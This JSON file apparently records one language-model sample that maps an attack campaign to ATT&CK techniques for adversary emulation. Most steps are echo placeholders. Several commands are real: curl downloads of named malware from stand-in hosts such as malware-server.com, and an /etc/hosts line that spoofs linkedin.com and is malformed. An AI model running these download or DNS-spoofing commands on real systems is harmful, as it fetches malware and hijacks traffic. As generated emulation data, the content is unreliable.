@@ -1,0 +1,94 @@
+{
+  "campaign_id": "C0010",
+  "model": "qwen2.5-coder:14b",
+  "sample": 1,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-configuration",
+      "command": "echo 'linkedin.com A 192.168.1.1' >> /etc/hosts",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "linkedin.com",
+        "ip_address": "192.168.1.1"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "domain-compromise",
+      "command": "echo 'Compromised Shipping Company Domain' > /dev/null",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "shippingcompany.com"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "malware-development",
+      "command": "echo 'Developing SUGARUSH malware' > /dev/null",
+      "target": "actor.primary",
+      "parameters": {
+        "malware_name": "SUGARUSH"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "tool-acquisition",
+      "command": "git clone https://github.com/metasploit/framework.git",
+      "target": "actor.primary",
+      "parameters": {
+        "tool_name": "METASPLOIT"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "malware-upload",
+      "command": "curl -o /opt/SUGARUSH http://malware-server.com/SUGARUSH",
+      "target": "actor.primary",
+      "parameters": {
+        "malware_url": "http://malware-server.com/SUGARUSH"
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "tool-upload",
+      "command": "curl -o /opt/METASPLOIT http://tools-server.com/METASPLOIT",
+      "target": "actor.primary",
+      "parameters": {
+        "tool_url": "http://tools-server.com/METASPLOIT"
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "watering-hole-setup",
+      "command": "echo 'Setting up watering hole on legitimate Israeli shipping company' > /dev/null",
+      "target": "actor.primary",
+      "parameters": {
+        "company_domain": "shippingcompany.com"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "watering-hole-compromise",
+      "command": "echo 'Compromised watering hole page' > /dev/null",
+      "target": "target.primary",
+      "parameters": {
+        "company_domain": "shippingcompany.com"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "tool-transfer",
+      "command": "curl -o /opt/UNICORN http://malware-server.com/UNICORN",
+      "target": "target.primary",
+      "parameters": {
+        "tool_url": "http://malware-server.com/UNICORN"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "801b6b04f2cbbcf095764cecfac1698686ff992fc662f446572743ab60e28877"
+}
